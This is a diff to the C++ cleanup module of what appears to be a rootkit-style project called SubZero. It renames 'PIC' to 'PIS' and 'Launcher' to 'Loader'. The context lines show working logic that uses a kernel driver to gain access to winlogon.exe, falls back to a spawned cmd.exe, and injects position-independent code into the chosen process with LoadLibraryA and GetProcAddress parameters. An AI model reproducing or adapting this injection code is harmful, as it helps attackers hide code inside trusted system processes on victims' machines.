@@ -1,10 +1,10 @@
 #include "pch.h"
 #include "SubZeroCleanup.h"
-#include "PIC.h"
-#include "PicInjection.h"
+#include "PIS.h"
+#include "PISInjection.h"
 
 #include "../SubZeroDriver/SubZeroCommon.h"
-#include "../SubZeroLauncher/SubZeroLauncherCommon.h"
+#include "../SubZeroLoader/SubZeroLoaderCommon.h"
 #include "../SubZeroUtils/RegistryManager.h"
 #include "../SubZeroUtils/ServiceManager.h"
 #include "../SubZeroUtils/RunningProcesses.h"
@@ -55,7 +55,7 @@ void SubZeroCleanup::Cleanup()
                     finalException << DEBUG_TEXT("[-] DeviceIoControl Failed");
                 }
 
-            	// Current process now will bw able to inject the PIC to winlogon.exe
+            	// Current process now will bw able to inject the PIS to winlogon.exe
                 picTargetPID = GetProcessPidByProcessName(L"winlogon.exe");
             }
         }
@@ -95,7 +95,7 @@ void SubZeroCleanup::Cleanup()
         si.cb = sizeof(si);
         ::ZeroMemory(&pi, sizeof(pi));
 		
-		// Creates a child cmd process that will be the PIC target
+		// Creates a child cmd process that will be the PIS target
 		if (!::CreateProcessW(
             L"C:\\Windows\\system32\\cmd.exe",          // Module
             nullptr,					                // Command-line
@@ -108,7 +108,7 @@ void SubZeroCleanup::Cleanup()
 		    &si,                                        // STARTUPINFO pointer
 		    &pi))                                       // PROCESS_INFORMATION pointer             
 		{
-			finalException << DEBUG_TEXT("[-] Error finding target PIC injection process\n");
+			finalException << DEBUG_TEXT("[-] Error finding target PIS injection process\n");
 		}
 
         ::CloseHandle(pi.hProcess);
@@ -117,7 +117,7 @@ void SubZeroCleanup::Cleanup()
         picTargetPID = pi.dwProcessId;
     }
 
-    // Setup PIC parameters
+    // Setup PIS parameters
     PicParameters picParams =
     {
         LoadLibraryA,
@@ -126,14 +126,14 @@ void SubZeroCleanup::Cleanup()
     };
 
     if (nullptr == picParams.getProcAddress || nullptr == picParams.loadLibraryA)
-        finalException << DEBUG_TEXT("[-] Invalid PIC parameters\n");
+        finalException << DEBUG_TEXT("[-] Invalid PIS parameters\n");
 	
     else 
     {
-        // Inject PIC
+        // Inject PIS
         try
         {
-            PicInjection::InjectPic<PicParameters>(picTargetPID, &picParams, PicStart, PicEnd);
+            PISInjection::InjectPic<PicParameters>(picTargetPID, &picParams, PisStart, PisEnd);
         }
         catch (std::exception& exception)
         {
